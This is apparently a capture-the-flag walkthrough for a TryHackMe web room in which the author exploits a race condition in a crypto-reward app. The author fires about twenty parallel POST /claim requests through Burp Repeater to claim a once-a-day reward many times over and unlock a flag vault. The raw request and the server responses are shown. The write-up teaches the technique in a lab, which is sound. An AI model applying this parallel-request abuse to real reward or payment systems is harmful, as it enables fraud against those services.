# Towel on the Sunbed Walkthrough
<br/>

## Intro
Welcome to the *Towel on the Sunbed* challenge, here is the link to the [room](https://tryhackme.com/room/hh-towelonthesunbed-61271709) on TryHackMe.

This is a medium level challege about exploiting a single web vulnerability to get the flag.

"*Ponzi found the resort's wellness portal running a little side project called _Ponzi_ — a crypto rewards app, poolside edition. He set his towel down, claimed his daily reward, and went to reapply sunscreen. He came back to find the sunbed had been "claimed" three times over while he wasn't looking.
He's convinced the app owes him a spot in the Whale Vault. The app disagrees, politely, once every 24 hours. Somewhere between his request and the server's clock, there's a gap wide enough to walk a whale through.*"

Whenever you feel ready press on "start machine" and connect via OpenVPN or by using the AttackBox.

Let's begin!

<br/>
<br/>

## The Challenge
We can start by navigating to `http://10.82.145.14:3000/` in our browser, here we get redirected to `/auth/login` where we find a link to register an account on the platform.
As a good practice we always start a directory scan in the background:
```bash
gobuster dir -u http://10.82.145.14:3000  -w /usr/share/SecLists/Discovery/Web-Content/common.txt
```

Which finds:
```
/css                  (Status: 301) [Size: 153] [--> /css/]
/dashboard            (Status: 401) [Size: 61]
/js                   (Status: 301) [Size: 152] [--> /js/]
/vault                (Status: 401) [Size: 61]
```

Looking at the page source code we can also see the following script `auth.js`:
```js
function initAuthForm(formId, endpoint) {
    const form = document.getElementById(formId);
    const errorMsg = document.getElementById('error-msg');

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        errorMsg.classList.add('hidden');

        const data = Object.fromEntries(new FormData(form));
        try {
            const resp = await fetch(endpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            const json = await resp.json();
            if (!resp.ok) {
                errorMsg.textContent = json.error || 'An error occurred.';
                errorMsg.classList.remove('hidden');
                return;
            }
            window.location.href = json.redirect || '/dashboard';
        } catch (err) {
            errorMsg.textContent = 'Network error. Please try again.';
            errorMsg.classList.remove('hidden');
        }
    });
}
```

It takes care of the login, sending creedentials via a POST request, if they are right we get redirected to `/dashboard`.

It is now time to register a test account to access that, go to `http://10.82.145.14:3000/auth/register` and then login with the new credentials.
Once logged-in we can see a dashboard showing our wallet balance of "50 PONZI" cryptocrurrency, there is also a button to clain this reward.

Looking at the page source code we can spot another script `dashboard.js`:
```js
const WHALE_THRESHOLD = 150;

let countdownTimer = null;

async function loadDashboard() {
    const resp = await fetch('/dashboard/api/me');
    if (resp.status === 401) {
        window.location.href = '/auth/login';
        return;
    }
    const data = await resp.json();

    document.getElementById('nav-username').textContent = data.username;
    document.getElementById('balance').textContent = data.balance.toLocaleString(undefined, { maximumFractionDigits: 2 });

    const tierBadge = document.getElementById('tier-badge');
    tierBadge.textContent = data.tier;
    tierBadge.className = 'tier-badge ' + data.tier.toLowerCase();

    const tbody = document.querySelector('#prices-table tbody');
    tbody.innerHTML = '';
    for (const p of data.prices) {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td>${p.symbol}</td><td class="price-val">$${p.price_usd.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</td>`;
        tbody.appendChild(tr);
    }

    const claimBtn = document.getElementById('claim-btn');
    const claimStatus = document.getElementById('claim-status');
    if (countdownTimer) clearInterval(countdownTimer);

    if (data.canClaim) {
        claimBtn.disabled = false;
        claimStatus.textContent = 'Reward is available to claim now.';
    } else {
        claimBtn.disabled = true;
        let remaining = data.secondsUntilClaim;
        function updateCountdown() {
            const h = Math.floor(remaining / 3600);
            const m = Math.floor((remaining % 3600) / 60);
            const s = remaining % 60;
            claimStatus.textContent = `Next claim in: ${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
            if (remaining <= 0) {
                clearInterval(countdownTimer);
                claimBtn.disabled = false;
                claimStatus.textContent = 'Reward is available to claim now.';
            }
            remaining--;
        }
        updateCountdown();
        countdownTimer = setInterval(updateCountdown, 1000);
    }

    const pct = Math.min(100, (data.balance / WHALE_THRESHOLD) * 100);
    document.getElementById('progress-fill').style.width = pct + '%';
    document.getElementById('progress-label').textContent =
        `${data.balance.toLocaleString()} / ${WHALE_THRESHOLD.toLocaleString()} PONZI`;

    const vaultBtn = document.getElementById('vault-btn');
    vaultBtn.disabled = data.balance < WHALE_THRESHOLD;
}

document.getElementById('claim-btn').addEventListener('click', async () => {
    const btn = document.getElementById('claim-btn');
    btn.disabled = true;
    const status = document.getElementById('claim-status');
    try {
        const resp = await fetch('/claim', { method: 'POST' });
        const json = await resp.json();
        if (resp.ok) {
            status.textContent = `Claimed! +${json.reward} PONZI. PONZI price: $${json.priceSnapshot}`;
            await loadDashboard();
        } else {
            status.textContent = json.error || 'Claim failed.';
            btn.disabled = false;
        }
    } catch (e) {
        status.textContent = 'Network error.';
        btn.disabled = false;
    }
});

document.getElementById('vault-btn').addEventListener('click', async () => {
    const result = document.getElementById('vault-result');
    result.classList.add('hidden');
    try {
        const resp = await fetch('/vault');
        const json = await resp.json();
        if (resp.ok) {
            result.textContent = json.flag;
            result.classList.remove('hidden');
        } else {
            result.textContent = json.error || 'Vault locked.';
            result.style.borderColor = 'var(--red)';
            result.style.color = 'var(--red)';
            result.style.background = 'rgba(248,81,73,0.08)';
            result.classList.remove('hidden');
        }
    } catch (e) {
        result.textContent = 'Network error.';
        result.classList.remove('hidden');
    }
});

document.getElementById('logout-btn').addEventListener('click', async () => {
    await fetch('/auth/logout', { method: 'POST' });
    window.location.href = '/auth/login';
});

loadDashboard();
```

This script loads the current user's account details from `/dashboard/api/me` and renders their username, balance, tier, and a table of token prices. 

It controls a reward claim button, using the server-provided `canClaim` flag or a live countdown until the next claim is allowed. It tracks progress toward a 150 PONZI “whale” threshold and enables a vault button once the displayed balance reaches that value. The vault button calls `/vault` and displays a flag or error, while logout posts to `/auth/logout` and redirects to the login page.

The interesting parts here are 2:
1. We have discovered and API.
2. We found the `/vault` endopoit, and going there we get this message `{"error":"Access denied. Whale-tier balance required.","currentBalance":50,"required":150,"shortfall":100}`, this tells us that our job will be to find a way to becom a "crypto whale" to access the vault.

After claiming once we cannot claim anymore reward, we have a long cooldown.

<br/>

### Exploitation
My idea here is to try for a Race Condition, we will send a ton of request very quickly and if the server is not fast enought, more than 1 will slip in and we would be able to claim the reward necessary to become a whale.

So we firstly need to create a new account, since the first one we used to test the claim function is already burned.
Next enable Burp's Proxy anc capture the request for a new claim, send it to repeater and change from `GET` to `POST`:
```http
POST /claim HTTP/1.1
Host: 10.82.145.14:3000
Content-Length: 0
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: */*
Origin: http://10.82.145.14:3000
Referer: http://10.82.145.14:3000/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: connect.sid=s%3AMZgHLBGB3s3...REDACTED
Connection: keep-alive

```

Then click above and create a new group, in the new group duplicate the request for like 20 times.
When set click on the "Send" drop-down menu and select "send in parallel (last-byte synch)",  finally send them all!

We see it succeded and we get the following response:
```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 114
ETag: W/"72-r3odxvXcMJeJ6FQuIh/MoMP/Y4Y"
Date: Tue, 04 Aug 2026 17:05:46 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"message":"Staking reward claimed successfully.","reward":50,"newBalance":700,"tier":"Whale","priceSnapshot":4.2}
```

We now have 700 points, we are mega whales!

At this point disable the Proxy, go back into your browser and navigate to `/vault` here we get:
```json
{"message":"Welcome to the Whale Vault.","flag":"THM{REDACTED_FLAG_FOR_WRITEUP}}","balance":30}
```

And in this JSON there is the final flag:
--> REDACTED

<br/>
<br/>

Congratulations, you have successfully exploited the race condition and become a huge crypto whale, gained access to the vault and captured the flag!

Hope you had fun following along and completing the challenge.

Catch you in the next CTF 😃 
